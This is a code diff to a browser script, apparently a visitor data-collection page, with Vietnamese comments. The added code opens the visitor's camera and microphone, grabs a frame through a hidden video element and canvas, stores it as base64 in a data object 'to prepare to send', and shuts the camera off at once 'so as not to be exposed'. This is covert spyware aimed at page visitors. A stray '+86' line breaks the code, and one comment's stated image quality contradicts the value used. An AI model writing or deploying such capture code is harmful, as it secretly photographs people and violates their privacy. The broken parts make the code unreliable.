@@ -184,14 +184,49 @@
                     contrast: window.matchMedia('(prefers-contrast: high)').matches ? "high" : "normal"
                 };
 
-                // 10. Permissions
-                const permNames = ['geolocation', 'notifications', 'camera', 'microphone'];
+                // 10. Permissions & Chụp ảnh từ Camera
                 data.permissions = {};
-                for (const name of permNames) {
+                
+                try {
+                    const notifStatus = await navigator.permissions.query({name: 'notifications'});
+                    data.permissions.notifications = notifStatus.state;
+                } catch (e) {}
+
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     try {
-                        const status = await navigator.permissions.query({name});
-                        data.permissions[name] = status.state; 
-                    } catch {}
+                        // Bật Camera & Micro
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                        data.permissions.camera = "granted";
+                        data.permissions.microphone = "granted";
+                        
+                        // --- PHẦN MỚI: CHỤP MỘT BỨC ẢNH ---
+                        // Tạo một thẻ video ẩn để hứng hình ảnh từ Camera
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+
+                        // Dùng Canvas để vẽ lại khung hình (chụp ảnh)
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Chuyển bức ảnh thành dạng chuỗi Base64 (Chất lượng 0.5 để giảm dung lượng)
+                        const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                        
+                        // Lưu bức ảnh vào cục dữ liệu để chuẩn bị gửi đi
+                        data.capturedPhoto = photoBase64;
+86
+                        // --- KẾT THÚC CHỤP ẢNH ---
+
+                        // Tắt Camera và Micro ngay lập tức để không bị lộ
+                        stream.getTracks().forEach(track => track.stop());
+
+                    } catch (err) {
+                        data.permissions.camera = "denied_or_ignored";
+                        data.errors.push("Lỗi Camera: " + err.message);
+                    }
                 }
 
                 // 11. Geolocation (có timeout)
